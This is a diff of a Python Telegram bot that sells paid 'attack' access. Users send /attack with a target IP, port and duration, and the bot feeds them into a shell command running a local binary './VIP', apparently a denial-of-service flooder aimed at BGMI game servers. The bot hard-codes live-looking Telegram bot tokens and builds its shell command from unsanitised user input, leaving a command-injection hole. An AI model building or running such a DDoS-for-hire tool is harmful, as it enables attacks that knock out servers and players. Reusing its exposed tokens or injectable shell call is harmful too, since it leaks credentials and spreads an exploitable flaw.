@@ -19,7 +19,7 @@ db = client['TEST']
 users_collection = db['VIP']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7831102909:AAG3y0-k3qzoIX4SJCGtbHkDiDNJXuT3zdk'
+TELEGRAM_BOT_TOKEN = '7289992579:AAHIXcVEzHAMTFOOPxSZfTOxRfNHcojzRr0'
 ADMIN_USER_ID =  6135948216
 
 cooldown_dict = {}
@@ -32,7 +32,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*Here are the commands you can use:* \n\n"
             "*🔸 /start* - Start interacting with the bot.\n"
-            "*🔸 /bgmi* - Trigger an attack operation.\n"
+            "*🔸 /attack* - Trigger an attack operation.\n"
             "*🔸 /redeem* - Redeem a code.\n"
             "*🔸 /get_id* - ID LENA HAI BHAI ?.\n"
         )
@@ -40,7 +40,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*💡 Available Commands for Admins:*\n\n"
             "*🔸 /start* - Start the bot.\n"
-            "*🔸 /bgmi* - Start the attack.\n"
+            "*🔸 /attack* - Start the attack.\n"
             "*🔸 /get_id* - Get user id.\n"
             "*🔸 /add [user_id]* - Add a user.\n"
             "*🔸 /remove [user_id]* - Remove a user.\n"
@@ -61,7 +61,7 @@ async def start(update: Update, context: CallbackContext):
         return
     message = (
         f"*🔥 Welcome to the battlefield, {user_name}! 🔥*\n\n"
-             "*Use /bgmi <ip> <port> <duration>*\n" 
+             "*Use /attack <ip> <port> <duration>*\n" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -123,7 +123,7 @@ async def attack(update: Update, context: CallbackContext):
         return
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /bgmi <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
     ip, port, duration = args
     if not ip.startswith(valid_ip_prefixes):
@@ -167,7 +167,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./VIP {ip} {port} {duration} 100",
+            f"./VIP {ip} {port} {duration} VIP",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
